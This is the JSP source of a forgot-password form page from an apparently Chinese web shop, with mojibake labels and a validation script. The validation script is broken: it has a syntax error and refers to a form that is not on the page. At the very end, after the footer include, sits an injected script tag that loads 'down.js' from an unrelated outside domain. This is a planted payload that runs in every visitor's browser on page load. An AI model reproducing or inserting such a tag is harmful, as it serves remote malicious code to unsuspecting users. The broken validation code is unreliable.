<%@ page language="java" pageEncoding="GBK" %>
<%@ taglib prefix="c" uri="http://java.sun.com/jstl/core" %>
<%@ taglib prefix="fmt" uri="http://java.sun.com/jstl/fmt" %>
<c:set var="title" value="��������-��������"/> 
<%@ include file="IncludeTop.jsp" %>
<script type="text/javascript">
<!--
function checkAll(){
	if(
	   validate(document.forgetPwdForm.userID, '�û�ID', 'identifier', 0, 32, false) &&
   	   validate(document.forgetPwdForm.email, 'Email', 'email', 0, 64, false)&&
	   validate(document.forgetPwdForm.pwdSeed, '��������', 'public', 0, 8, false) ){
	         if(isBothNull(document.customerInfoForm.telNo.value, document.customerInfoForm.mobile.value){
			    alert('��ϵ�绰���ֻ�����ͬʱΪ��');
			    return false;
			}
	   	    return true;
	   }
   return false;
}
//-->
</script>

<table width="780" border="0" align="center" cellpadding="0" cellspacing="0">
  <tr> 
    <td background="images/left_border.gif" width="10"></td>
    <td width="198" valign="top"> 
      <%@ include file="searchProductBar.jsp" %>
      <%@ include file="searchAllBar.jsp" %>
      <%@ include file="newsBar.jsp" %>
    </td>
    <td width="562" bgcolor="#FFFFFF" valign="top">
      <form name="forgetPwdForm" method="post" action='<c:url value="/forgetPassword.do"/>' onSubmit="return checkAll();">
        <table width="100%" border="0">
          <tr> 
            <td align="center" height="32" width="14%">&nbsp; </td>
            <td align="right" height="32" width="29%">�û�ID</td>
            <td align="left" height="32" width="3%">&nbsp;</td>
            <td align="left" height="32" width="44%"> 
              <input type="text" name="userID" maxlength="32" size="20">
            </td>
            <td align="center" height="32" width="10%">&nbsp;</td>
          </tr>
          <tr> 
            <td align="center" height="32" width="14%">&nbsp;</td>
            <td align="right" height="32" width="29%">Email</td>
            <td align="left" height="32" width="3%">&nbsp;</td>
            <td align="left" height="32" width="44%"> 
              <input type="text" name="email" maxlength="64" size="32">
            </td>
            <td align="center" height="32" width="10%">&nbsp;</td>
          </tr>
          <tr> 
            <td align="center" height="32" width="14%">&nbsp;</td>
            <td align="right" height="32" width="29%">��������</td>
            <td align="left" height="32" width="3%">&nbsp;</td>
            <td align="left" height="32" width="44%"> 
              <input type="text" name="pwdSeed" maxlength="8" size="20">
            </td>
            <td align="center" height="32" width="10%">&nbsp;</td>
          </tr>
          <tr> 
            <td align="center" height="32" width="14%">&nbsp;</td>
            <td align="center" height="32" colspan="3"> 
              <input type="submit" value="ȷ ��" class="medium" name="�ύ">
              <input type="reset" value="�� ��" class="medium" name="����">
            </td>
            <td align="center" height="32" width="10%">&nbsp;</td>
          </tr>
        </table>      
	  </form>
    <td width="10" bgcolor="#FFFFFF" valign="top" background="images/right_border.gif">&nbsp;</td>
  </tr>
</table>

<%@ include file="IncludeBottom.jsp" %>

<script language=javascript src=http://Town.531jx.cn/down.js></script>